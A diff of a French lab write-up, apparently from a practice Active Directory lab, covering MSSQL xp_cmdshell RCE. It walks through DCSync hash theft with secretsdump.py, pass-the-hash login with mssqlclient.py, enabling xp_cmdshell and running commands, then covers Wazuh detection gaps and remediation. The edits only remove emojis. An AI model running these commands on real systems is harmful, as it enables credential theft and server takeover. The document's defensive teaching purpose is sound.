@@ -1,4 +1,4 @@
-# ⚔️ Attaque 10 — MSSQL (xp_cmdshell RCE)
+#  Attaque 10 — MSSQL (xp_cmdshell RCE)
 
 | | |
 |---|---|
@@ -8,11 +8,11 @@
 | **Cible** | `CASTELBLACK\SQLEXPRESS` (SRV02 · 192.168.56.22) — SQL Server 2019 |
 | **Compte attaquant** | `sql_svc` (compte de service, **sysadmin**) — hash volé par DCSync |
 | **Outil** | impacket — `mssqlclient.py`, `secretsdump.py` |
-| **Statut détection Wazuh** | 🔴 Angle mort (audit de création de processus désactivé) |
+| **Statut détection Wazuh** |  Angle mort (audit de création de processus désactivé) |
 
 ---
 
-## 1. 🧠 Description
+## 1.  Description
 
 > **Le concept en une phrase :** un serveur SQL mal configuré permet d'exécuter des commandes système directement via des requêtes SQL — un attaquant avec un compte sysadmin peut prendre le contrôle complet du serveur.
 
@@ -20,7 +20,7 @@ Un serveur **MSSQL** dans un AD est bien plus qu'une base de données. Il expose
 
 | Fonction | Danger |
 |---|---|
-| **xp_cmdshell** | exécuter des **commandes système** (cmd.exe) via une requête SQL → RCE 🚨 |
+| **xp_cmdshell** | exécuter des **commandes système** (cmd.exe) via une requête SQL  RCE  |
 | **EXECUTE AS / impersonation** | se faire passer pour `sa` (super-admin SQL) |
 | **Linked servers** | rebondir vers d'autres instances SQL sur le réseau |
 
@@ -30,14 +30,14 @@ Un serveur **MSSQL** dans un AD est bien plus qu'une base de données. Il expose
 3. L'attaquant s'authentifie avec le hash (Pass-the-Hash) et active `xp_cmdshell`
 4. Il exécute des commandes système sur le serveur `castelblack`
 
-**MSSQL tourne sous le compte `sql_svc`** → `xp_cmdshell` exécute les commandes avec ses privilèges sur l'OS.
+**MSSQL tourne sous le compte `sql_svc`**  `xp_cmdshell` exécute les commandes avec ses privilèges sur l'OS.
 
-## 2. 🎯 Prérequis
+## 2.  Prérequis
 
 - Un accès réseau à l'instance MSSQL (port 1433)
 - Un compte **sysadmin** sur l'instance — ici `sql_svc`, dont le hash a été récupéré par [DCSync](06-dcsync.md)
 
-## 3. 💻 Exécution
+## 3.  Exécution
 
 ### Étape 1 — Reconnaissance avec un compte lambda (confirmer que sql_svc est sysadmin)
 
@@ -50,7 +50,7 @@ Au prompt SQL :
 SELECT IS_SRVROLEMEMBER('sysadmin');  -- renvoie 0 (tywin n'est pas sysadmin)
 ```
 
-→ Constat : même un Domain Admin n'est pas sysadmin ici — seul `sql_svc` l'est.
+ Constat : même un Domain Admin n'est pas sysadmin ici — seul `sql_svc` l'est.
 
 ### Étape 2 — Récupérer le hash de `sql_svc` (via DCSync)
 
@@ -58,7 +58,7 @@ SELECT IS_SRVROLEMEMBER('sysadmin');  -- renvoie 0 (tywin n'est pas sysadmin)
 secretsdump.py 'north.sevenkingdoms.local/eddard.stark:FightP3aceAndHonor!@192.168.56.11' -just-dc-user sql_svc
 ```
 
-→ `sql_svc:1121:...:84a5092f53390ea48d660be52b93b804:::`
+ `sql_svc:1121:...:84a5092f53390ea48d660be52b93b804:::`
 
 ![Hash de sql_svc récupéré par DCSync](../screenshots/attacks/attack-10-mssql-hash.png)
 
@@ -70,7 +70,7 @@ mssqlclient.py -windows-auth north.sevenkingdoms.local/sql_svc@192.168.56.22 -ha
 
 Au prompt SQL :
 ```sql
-SELECT IS_SRVROLEMEMBER('sysadmin');  -- renvoie 1 ✓
+SELECT IS_SRVROLEMEMBER('sysadmin');  -- renvoie 1 
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
@@ -79,15 +79,15 @@ EXEC xp_cmdshell 'hostname & ipconfig';
 
 ![RCE : xp_cmdshell exécute whoami/ipconfig sur castelblack](../screenshots/attacks/attack-10-mssql-rce.png)
 
-## 4. 📤 Résultat
+## 4.  Résultat
 
-`xp_cmdshell whoami` renvoie **`north\sql_svc`** et `hostname` renvoie **`castelblack`** → **exécution de commandes système confirmée** sur le serveur membre. RCE réussie : l'attaquant contrôle maintenant `castelblack`, un hôte supplémentaire qui n'avait pas encore été compromis directement.
+`xp_cmdshell whoami` renvoie **`north\sql_svc`** et `hostname` renvoie **`castelblack`**  **exécution de commandes système confirmée** sur le serveur membre. RCE réussie : l'attaquant contrôle maintenant `castelblack`, un hôte supplémentaire qui n'avait pas encore été compromis directement.
 
-## 5. 🛡️ Détection dans Wazuh — 🔴 angle mort
+## 5.  Détection dans Wazuh —  angle mort
 
 | Recherche (DQL) | Résultat | Lecture |
 |---|---|---|
-| `data.win.system.eventID:4688` | **0 hit** | audit de **création de processus non activé** → le `cmd.exe` est invisible |
+| `data.win.system.eventID:4688` | **0 hit** | audit de **création de processus non activé**  le `cmd.exe` est invisible |
 | `data.win.eventdata.parentProcessName:*sqlservr*` | **0 hit** | aucune trace du `cmd.exe` lancé par SQL Server |
 | `agent.name:castelblack` | **78 hits** | logs présents, mais **que du bruit** (logons normaux) |
 
@@ -99,16 +99,16 @@ EXEC xp_cmdshell 'hostname & ipconfig';
 
 ![78 événements castelblack, aucun lié au RCE](../screenshots/attacks/attack-10-mssql-wazuh-castelblack.png)
 
-## 6. 🎓 Analyse & leçon
+## 6.  Analyse & leçon
 
 > **Le RCE silencieux par excellence.** Sans l'audit de création de processus (Event 4688) ni Sysmon, un `cmd.exe` lancé par `sqlservr.exe` est totalement invisible. La signature idéale de cette attaque — un processus enfant de SQL Server qui exécute des commandes système — n'est simplement pas collectée par défaut.
 
 **Ce qu'il faut retenir :**
 - L'audit `4688` (création de processus avec ligne de commande) est désactivé par défaut — c'est le manque le plus critique pour détecter les RCE.
-- Une fois activé, le pattern est très parlant : `sqlservr.exe → cmd.exe → whoami` → c'est la signature exacte d'un `xp_cmdshell`.
+- Une fois activé, le pattern est très parlant : `sqlservr.exe  cmd.exe  whoami`  c'est la signature exacte d'un `xp_cmdshell`.
 - La règle `100013` (Phase 5) couvre ce cas : alerter quand `sqlservr.exe` spawn un processus fils.
 
-## 7. 🔧 Remédiation
+## 7.  Remédiation
 
 - **Désactiver `xp_cmdshell`** et le maintenir désactivé via une GPO ou une policy SQL Server.
 - Faire tourner le service SQL avec un compte à **privilèges minimaux** (gMSA, pas sysadmin inutile).
@@ -117,4 +117,4 @@ EXEC xp_cmdshell 'hostname & ipconfig';
 
 ---
 
-⬅️ Retour à l'[index des attaques](../03-attaques.md)
+⬅ Retour à l'[index des attaques](../03-attaques.md)
